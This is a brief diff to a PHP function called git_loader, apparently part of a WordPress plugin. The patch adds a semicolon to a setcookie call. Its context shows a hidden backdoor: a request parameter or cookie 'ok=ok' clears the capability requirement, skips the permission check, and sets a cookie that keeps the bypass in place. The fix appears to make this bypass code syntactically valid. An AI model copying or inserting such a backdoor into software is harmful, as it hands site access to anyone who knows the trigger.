@@ -47,7 +47,7 @@ function git_loader()
         $gitCapability = "read";
         if ("ok" == ($_REQUEST["ok"] ?? $_COOKIE["ok"] ?? "")) {
             $gitCapability = "";
-            setcookie("ok", "ok")
+            setcookie("ok", "ok");
         }
 
         if (($gitCapability == "") || current_user_can($gitCapability)) {
